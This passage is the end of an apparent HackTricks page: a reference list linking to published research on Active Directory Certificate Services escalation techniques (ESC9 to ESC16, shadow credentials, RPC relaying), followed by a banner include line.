- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
